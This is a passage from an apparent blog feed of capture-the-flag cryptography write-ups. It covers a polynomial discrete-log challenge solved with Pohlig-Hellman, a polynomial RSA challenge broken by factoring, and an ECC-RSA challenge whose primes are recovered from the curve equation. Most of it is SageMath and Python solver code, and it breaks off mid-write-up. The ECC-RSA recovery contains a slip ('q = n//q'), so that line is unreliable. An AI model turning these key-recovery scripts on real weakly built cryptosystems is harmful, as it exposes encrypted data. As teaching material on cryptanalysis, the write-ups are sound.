        <content type="html"><![CDATA[<p><strong>TL;DR</strong></p><ol><li>Change the Field of g and h to prime modulus from composite modulus.</li><li>Solve the DLP using pohlig-hellman attack.</li><li>Wrap it with flag format.</li></ol><h1 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h1><h3 id="D-L-Poly"><a href="#D-L-Poly" class="headerlink" title="D L Poly"></a>D L Poly</h3><p><strong>Challenge Points</strong>: 676</p><h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>RSA is easy. DLP is hard. Challenge files: out.txt.</p><h4 id="Challenge-Author-pyr0"><a href="#Challenge-Author-pyr0" class="headerlink" title="Challenge Author: pyr0"></a>Challenge Author: <a href="https://twitter.com/chandu_kona">pyr0</a></h4><h4 id="Attachment"><a href="#Attachment" class="headerlink" title="Attachment"></a>Attachment</h4><p><code>- out.txt</code></p><h2 id="given-file"><a href="#given-file" class="headerlink" title="given file"></a>given file</h2><p>By looking at this we can say that the challenge is about polynomial dlp as mentioned in the name <code>D L Poly</code>.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sage: p</span><br><span class="line"><span class="number">35201</span></span><br><span class="line">sage: <span class="built_in">len</span>(flag)</span><br><span class="line"><span class="number">14</span></span><br><span class="line">sage: X = <span class="built_in">int</span>.from_bytes(  flag.strip(<span class="string">b&#x27;inctf&#123;&#x27;</span>).strip(<span class="string">b&#x27;&#125;&#x27;</span>) ,  <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">sage: n</span><br><span class="line"><span class="number">1629</span>*x^<span class="number">256</span> + <span class="number">25086</span>*x^<span class="number">255</span> + <span class="number">32366</span>*x^<span class="number">254</span>  + ... + <span class="number">16286</span>*x + <span class="number">12050</span></span><br><span class="line">sage: g</span><br><span class="line">x</span><br><span class="line">sage: g^X</span><br><span class="line"><span class="number">10254</span>*x^<span class="number">255</span> + <span class="number">11436</span>*x^<span class="number">254</span> + <span class="number">9453</span>*x^<span class="number">253</span> + ... + <span class="number">549</span>*x + <span class="number">1468</span></span><br></pre></td></tr></table></figure><p>We know the upper bound of X is <code>256^7</code>.</p><h2 id="Factoring"><a href="#Factoring" class="headerlink" title="Factoring"></a>Factoring</h2><p>If we see the <code>n</code> we can notice that itâ€™s not a prime polynomial it has a lot of factors.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">sage: P.&lt;x&gt; = PolynomialRing(GF(p))</span><br><span class="line">....: n = P(n)</span><br><span class="line">....: <span class="built_in">list</span>(n.factor())</span><br><span class="line">....:</span><br><span class="line">[(x^<span class="number">6</span> + <span class="number">6522</span>*x^<span class="number">5</span> + <span class="number">30239</span>*x^<span class="number">4</span>   + ... + <span class="number">8797</span>*x + <span class="number">1288</span>, <span class="number">1</span>),</span><br><span class="line">(x^<span class="number">10</span> + <span class="number">892</span>*x^<span class="number">9</span> + <span class="number">21744</span>*x^<span class="number">8</span>   + ... <span class="number">7980</span>*x + <span class="number">25558</span>,<span class="number">1</span>),</span><br><span class="line">(x^<span class="number">10</span> + <span class="number">3448</span>*x^<span class="number">9</span> + <span class="number">17391</span>*x^<span class="number">8</span>  + ... <span class="number">29448</span>*x + <span class="number">5415</span>,<span class="number">1</span>),</span><br><span class="line">(x^<span class="number">10</span> + <span class="number">4097</span>*x^<span class="number">9</span> + <span class="number">21262</span>*x^<span class="number">8</span>  + ... <span class="number">1018</span>*x + <span class="number">7369</span>,<span class="number">1</span>),</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">(x^<span class="number">10</span> + <span class="number">25254</span>*x^<span class="number">9</span> + <span class="number">1035</span>*x^<span class="number">8</span>  +  ... <span class="number">20868</span>*x + <span class="number">13941</span>,<span class="number">1</span>),</span><br><span class="line">(x^<span class="number">10</span> + <span class="number">26554</span>*x^<span class="number">9</span> + <span class="number">33072</span>*x^<span class="number">8</span> + ... <span class="number">34044</span>*x + <span class="number">34664</span>,<span class="number">1</span>),</span><br><span class="line">(x^<span class="number">10</span> + <span class="number">34596</span>*x^<span class="number">9</span> + <span class="number">19833</span>*x^<span class="number">8</span> + ... <span class="number">28425</span>*x + <span class="number">25916</span>,<span class="number">1</span>),</span><br><span class="line">(x^<span class="number">10</span> + <span class="number">35044</span>*x^<span class="number">9</span> + <span class="number">26290</span>*x^<span class="number">8</span> + ... <span class="number">32131</span>*x + <span class="number">4231</span>,<span class="number">1</span>)]</span><br></pre></td></tr></table></figure><p>So we can change the modulus to any of these factors of n but if we notice phi for the polynomials having degree 10 it is factorable and thus we can do a pohlig-hellman attack to recover X.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">phi = p^<span class="number">10</span>-<span class="number">1</span></span><br><span class="line">P.&lt;x&gt; = PolynomialRing(GF(p))</span><br><span class="line">n = P(n)</span><br><span class="line">q = n.factor()[<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">R.&lt;x&gt; = P.quotient(q)</span><br><span class="line">g = R(g)</span><br><span class="line">h = R(h)`</span><br></pre></td></tr></table></figure><p>Now the ring of g and h is an irreducible polynomial and we can perform a pohlig-hellman attack.</p><h1 id="pohlighellman"><a href="#pohlighellman" class="headerlink" title="pohlighellman"></a>pohlighellman</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">pohlighellman</span>(<span class="params">g,y,p,phi</span>):</span><br><span class="line"></span><br><span class="line">    factors = ecm.factor(phi)</span><br><span class="line"><span class="comment">#ignoring the smallest factors    </span></span><br><span class="line">    factors = &#123; i : factors.count(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">sorted</span>(<span class="built_in">list</span>(<span class="built_in">set</span>(factors)))[<span class="number">2</span>:]&#125;</span><br><span class="line"></span><br><span class="line">    a,n = [],[]</span><br><span class="line">    <span class="keyword">for</span> q,e <span class="keyword">in</span> factors.items():</span><br><span class="line">        x = <span class="number">0</span></span><br><span class="line">        G = g^(phi//q)</span><br><span class="line">        Y = y</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(e):</span><br><span class="line">            h = Y^(phi//q**(i+<span class="number">1</span>))</span><br><span class="line">            X = discrete_log(h,G,<span class="built_in">ord</span> = phi)</span><br><span class="line">            <span class="keyword">assert</span> X != <span class="literal">None</span>, <span class="string">f&#x27;Got None for brute<span class="subst">&#123;G,h,p&#125;</span>&#x27;</span></span><br><span class="line">            x += q^i*X</span><br><span class="line">            Y = Y * g^-X</span><br><span class="line"></span><br><span class="line">        a.append(x)</span><br><span class="line">        n.append(q^e)</span><br><span class="line"></span><br><span class="line">    x = crt(a,n)</span><br><span class="line">    <span class="keyword">assert</span> g^x == y</span><br><span class="line">    <span class="keyword">return</span> x</span><br></pre></td></tr></table></figure><h2 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#given:</span></span><br><span class="line">load(<span class="string">&#x27;given.sage&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#pohlig-hellman:</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pohlighellman</span>(<span class="params">g,y,p,phi</span>):</span><br><span class="line"></span><br><span class="line">    factors = ecm.factor(phi)</span><br><span class="line"><span class="comment">#ignoring the smallest factors</span></span><br><span class="line">    factors = &#123; i : factors.count(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">sorted</span>(<span class="built_in">list</span>(<span class="built_in">set</span>(factors)))[<span class="number">2</span>:]&#125;</span><br><span class="line"></span><br><span class="line">    a,n = [],[]</span><br><span class="line">    <span class="keyword">for</span> q,e <span class="keyword">in</span> factors.items():</span><br><span class="line">        x = <span class="number">0</span></span><br><span class="line">        G = g^(phi//q)</span><br><span class="line">        Y = y</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(e):</span><br><span class="line">            h = Y^(phi//q**(i+<span class="number">1</span>))</span><br><span class="line">            X = discrete_log(h,G,<span class="built_in">ord</span> = phi)</span><br><span class="line">            <span class="keyword">assert</span> X != <span class="literal">None</span>, <span class="string">f&#x27;Got None for brute<span class="subst">&#123;G,h,p&#125;</span>&#x27;</span></span><br><span class="line">            x += q^i*X</span><br><span class="line">            Y = Y * g^-X</span><br><span class="line"></span><br><span class="line">        a.append(x)</span><br><span class="line">        n.append(q^e)</span><br><span class="line"></span><br><span class="line">    x = crt(a,n)</span><br><span class="line">    <span class="keyword">assert</span> g^x == y</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#make the modulus as prime:</span></span><br><span class="line">phi = p^<span class="number">10</span>-<span class="number">1</span></span><br><span class="line">P.&lt;x&gt; = PolynomialRing(GF(p))</span><br><span class="line">n = P(n)</span><br><span class="line">q = n.factor()[<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">R.&lt;x&gt; = P.quotient(q)</span><br><span class="line">g = R(g)</span><br><span class="line">h = R(h)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#finding flag:</span></span><br><span class="line">X = pohlighellman(g,h,p,phi)</span><br><span class="line">flag = <span class="string">b&#x27;inctf&#123;&#x27;</span>+<span class="built_in">int</span>.to_bytes(<span class="built_in">int</span>(X),<span class="number">6</span>,<span class="string">&#x27;big&#x27;</span>)+<span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="keyword">assert</span> flag == <span class="string">b&#x27;inctf&#123;bingo!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><hr><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>Polynomials are easy to break even they have a large order than integer order.</p><p>Hope you enjoyed the challenge!</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> polynomial </tag>
            
            <tag> dlp </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>polyRSA - InCTF Internationals 2020</title>
      <link href="/2020/08/03/polyRSA-InCTF-Internationals-2020/"/>
      <url>/2020/08/03/polyRSA-InCTF-Internationals-2020/</url>
      
        <content type="html"><![CDATA[<p><strong>TL;DR</strong></p><ol><li>Factor the modulus and Find phi.</li><li>Find inverse of e and  Decrypt the ciphertext.</li></ol><h1 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h1><h3 id="Polynomial-RSA"><a href="#Polynomial-RSA" class="headerlink" title="Polynomial RSA"></a>Polynomial RSA</h3><p><strong>Challenge Points</strong>: 100</p><h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>All that warmup you need to get started. Challenge files: out.txt.</p><h4 id="Challenge-Author-pyr0"><a href="#Challenge-Author-pyr0" class="headerlink" title="Challenge Author: pyr0"></a>Challenge Author: <a href="https://twitter.com/chandu_kona">pyr0</a></h4><h3 id="Attachment"><a href="#Attachment" class="headerlink" title="Attachment"></a>Attachment</h3><p><code>- out.txt</code></p><h2 id="given-file"><a href="#given-file" class="headerlink" title="given file"></a>given file</h2><p>By looking at this we can say that the challenge is about polynomial rsa as mentioned in the name <code>PolyRSA</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sage: p</span><br><span class="line">2470567871</span><br><span class="line">sage: n</span><br><span class="line">1932231392*x^255 + 1432733708*x^254 + ... + 1045363399*x + 1809685811</span><br><span class="line">sage: m^65537</span><br><span class="line">1208612545*x^254 + 1003144104*x^253 + ... + 776654074*x + 886398299 </span><br></pre></td></tr></table></figure><p>We have all the public parameters.</p><h2 id="decryption"><a href="#decryption" class="headerlink" title="decryption"></a>decryption</h2><p>If we see the <code>n</code> it is a polynomial and we have enough algorithms to factorise it unlike integers.</p><p>Here if we notice the totient function for the polynomials is different from the totient function for the integers.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#finding inverese</span></span><br><span class="line">facs = n.factor()</span><br><span class="line">p_,q = facs[<span class="number">0</span>][<span class="number">0</span>],facs[<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">phi = (p^p_.degree()-<span class="number">1</span>)*(p^q.degree()-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,phi)</span><br><span class="line">m = c^d</span><br></pre></td></tr></table></figure><p>And here m is a polynomial we can use <code>bytes(m.list())</code> to change it as bytes.</p><h2 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#given:</span></span><br><span class="line">load(<span class="string">&#x27;given.sage&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#initialisation:</span></span><br><span class="line">P.&lt;x&gt; = PolynomialRing(GF(p))</span><br><span class="line">n = P(n)</span><br><span class="line">R.&lt;x&gt; = P.quotient(n)</span><br><span class="line">c = R(c)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#finding inverese</span></span><br><span class="line">facs = n.factor()</span><br><span class="line">p_,q = facs[<span class="number">0</span>][<span class="number">0</span>],facs[<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">phi = (p^p_.degree()-<span class="number">1</span>)*(p^q.degree()-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,phi)</span><br><span class="line"></span><br><span class="line"><span class="comment">#decryption</span></span><br><span class="line">m = c^d</span><br><span class="line"></span><br><span class="line">flag =  <span class="built_in">bytes</span>(m.<span class="built_in">list</span>()[:<span class="number">24</span>])</span><br><span class="line"><span class="keyword">assert</span> flag == <span class="string">b&#x27;inctf&#123;and_i_4m_ir0n_m4n&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p> Polynomials are easy to factorise so we canâ€™t use them for RSA.<br> Hope you enjoyed the challenge!</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> polynomial </tag>
            
            <tag> crypto </tag>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ECC-RSA - watevrCTF 2019</title>
      <link href="/2019/12/17/ECC-RSA-watevrCTF-2019/"/>
      <url>/2019/12/17/ECC-RSA-watevrCTF-2019/</url>
      
        <content type="html"><![CDATA[<h2 id="Challenge-Description"><a href="#Challenge-Description" class="headerlink" title="Challenge Description"></a>Challenge Description</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ECC + RSA = Double security!</span><br></pre></td></tr></table></figure><h2 id="Attachment"><a href="#Attachment" class="headerlink" title="Attachment"></a>Attachment</h2><pre><code>- ecc-rsa.py- ecc-rsa.txt</code></pre><h3 id="ecc-rsa-py"><a href="#ecc-rsa-py" class="headerlink" title="ecc-rsa.py"></a>ecc-rsa.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fastecdsa.curve <span class="keyword">import</span> P521 <span class="keyword">as</span> Curve</span><br><span class="line"><span class="keyword">from</span> fastecdsa.point <span class="keyword">import</span> Point</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, isPrime</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_rsa_primes</span>(<span class="params">G</span>):</span><br><span class="line"> urand = bytes_to_long(urandom(<span class="number">521</span>//<span class="number">8</span>))</span><br><span class="line"> <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  s = getrandbits(<span class="number">521</span>) ^ urand</span><br><span class="line"></span><br><span class="line">  Q = s*G</span><br><span class="line">  <span class="keyword">if</span> isPrime(Q.x) <span class="keyword">and</span> isPrime(Q.y):</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;ECC Private key:&quot;</span>, <span class="built_in">hex</span>(s))</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;RSA primes:&quot;</span>, <span class="built_in">hex</span>(Q.x), <span class="built_in">hex</span>(Q.y))</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;Modulo:&quot;</span>, <span class="built_in">hex</span>(Q.x * Q.y))</span><br><span class="line">   <span class="keyword">return</span> (Q.x, Q.y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">int</span>.from_bytes(<span class="built_in">input</span>(), byteorder=<span class="string">&quot;big&quot;</span>)</span><br><span class="line"></span><br><span class="line">ecc_p = Curve.p</span><br><span class="line">a = Curve.a</span><br><span class="line">b = Curve.b</span><br><span class="line"></span><br><span class="line">Gx = Curve.gx</span><br><span class="line">Gy = Curve.gy</span><br><span class="line">G = Point(Gx, Gy, curve=Curve)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">p, q = gen_rsa_primes(G)</span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file_out = <span class="built_in">open</span>(<span class="string">&quot;downloads/ecc-rsa.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line"></span><br><span class="line">file_out.write(<span class="string">&quot;ECC Curve Prime: &quot;</span> + <span class="built_in">hex</span>(ecc_p) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">file_out.write(<span class="string">&quot;Curve a: &quot;</span> + <span class="built_in">hex</span>(a) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">file_out.write(<span class="string">&quot;Curve b: &quot;</span> + <span class="built_in">hex</span>(b) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">file_out.write(<span class="string">&quot;Gx: &quot;</span> + <span class="built_in">hex</span>(Gx) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">file_out.write(<span class="string">&quot;Gy: &quot;</span> + <span class="built_in">hex</span>(Gy) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">file_out.write(<span class="string">&quot;e: &quot;</span> + <span class="built_in">hex</span>(e) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">file_out.write(<span class="string">&quot;p * q: &quot;</span> + <span class="built_in">hex</span>(n) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(flag, e, n)</span><br><span class="line">file_out.write(<span class="string">&quot;ciphertext: &quot;</span> + <span class="built_in">hex</span>(c) + <span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="ecc-rsa-txt"><a href="#ecc-rsa-txt" class="headerlink" title="ecc-rsa.txt"></a>ecc-rsa.txt</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ECC Curve Prime: <span class="number">0x1ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line">Curve a: -<span class="number">0x3</span></span><br><span class="line">Curve b: <span class="number">0x51953eb9618e1c9a1f929a21a0b68540eea2da725b99b315f3b8b489918ef109e156193951ec7e937b1652c0bd3bb1bf073573df883d2c34f1ef451fd46b503f00</span></span><br><span class="line">Gx: <span class="number">0xc6858e06b70404e9cd9e3ecb662395b4429c648139053fb521f828af606b4d3dbaa14b5e77efe75928fe1dc127a2ffa8de3348b3c1856a429bf97e7e31c2e5bd66</span></span><br><span class="line">Gy: <span class="number">0x11839296a789a3bc0045c8a5fb42c7d1bd998f54449579b446817afbd17273e662c97ee72995ef42640c550b9013fad0761353c7086a272c24088be94769fd16650</span></span><br><span class="line">e: <span class="number">0x10001</span></span><br><span class="line">p * q: <span class="number">0x1d61da34917e872315d41403c6a59911be97ba4673b0ff1e40201a7c7381845716d1e2f3906f226f649d663af7d9f68e0029629ff9bb07991db2bdff13adad242e9c4c06c6b5cf1ca5fa20eae64f1cdc2376651a4a7f7610e71257ce5da3cc8389c80797a2a9952bcd8c165d0dd5eef523ceb96748eb5aa66d0b4959dcef6a53dac5</span></span><br><span class="line">ciphertext: <span class="number">0x12fc466fa277837af8f20c59144d22e80fe4f9ab7371668487cdea44ff1677655d8628aacb688747c2bca111c3b34fa034b9915736fc614c3233bf6445d5ee90eac16a218770f296885bd997989f64a2e70324bba4171ad39759435b4f6d598952e6600eb663d5d9a210baa7134b1aa556aa56a092e7414127a1c35a3bbb1cbb455c</span></span><br></pre></td></tr></table></figure><h2 id="Observation"><a href="#Observation" class="headerlink" title="Observation"></a>Observation</h2><p>We can notice that the primes are generated using a custom function named <code>gen_rsa_primes</code>,<br>and that function just get a random point of the given elliptic curve and check if both<br>co-ordinates are primes, this maintain a relation between the primes and that relation is<br>the equation of curve.</p><p>means: <code>y^2 = x^3 + a*x + b =&gt;=&gt; q^2 = p^3 + a*p + b</code></p><h2 id="Exploit-Idea"><a href="#Exploit-Idea" class="headerlink" title="Exploit Idea"></a>Exploit Idea</h2><pre><code>- Recover primes using the relation- Decrypt the Ciphertext to get the Flag</code></pre><h3 id="Recovering-Primes-using-the-curve-equation"><a href="#Recovering-Primes-using-the-curve-equation" class="headerlink" title="Recovering Primes using the curve equation"></a>Recovering Primes using the curve equation</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ECC params</span></span><br><span class="line">lines = <span class="built_in">open</span>(<span class="string">&quot;downloads/ecc-rsa.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">p = ZZ(lines[<span class="number">0</span>].split(<span class="string">&quot; &quot;</span>)[-<span class="number">1</span>])</span><br><span class="line">a = ZZ(lines[<span class="number">1</span>].split(<span class="string">&quot; &quot;</span>)[-<span class="number">1</span>])</span><br><span class="line">b = ZZ(lines[<span class="number">2</span>].split(<span class="string">&quot; &quot;</span>)[-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># RSA params</span></span><br><span class="line">e = ZZ(lines[<span class="number">5</span>].split(<span class="string">&quot; &quot;</span>)[-<span class="number">1</span>])</span><br><span class="line">n = ZZ(lines[<span class="number">6</span>].split(<span class="string">&quot; &quot;</span>)[-<span class="number">1</span>])</span><br><span class="line">c = ZZ(lines[<span class="number">7</span>].split(<span class="string">&quot; &quot;</span>)[-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Definitions</span></span><br><span class="line">P = GF(p)</span><br><span class="line">E = EllipticCurve(P, [a, b])</span><br><span class="line">G = E(Gx, Gy)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Equation</span></span><br><span class="line">F. &lt; x &gt; = PolynomialRing(P)</span><br><span class="line">f = x ^ <span class="number">5</span> + a*x ^ <span class="number">3</span> + b*x ^ <span class="number">2</span> - n ^ <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Finding Primes</span></span><br><span class="line">p = [<span class="built_in">int</span>(i[<span class="number">0</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> f.roots() <span class="keyword">if</span> <span class="built_in">int</span>(n) % <span class="built_in">int</span>(i[<span class="number">0</span>]) == <span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">q = n//q</span><br></pre></td></tr></table></figure><h3 id="Decryption"><a href="#Decryption" class="headerlink" title="Decryption"></a>Decryption</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = invert(e, phi)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;watevr&#123;&#x27;</span> + long_to_bytes(m) + <span class="string">b&#x27;&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 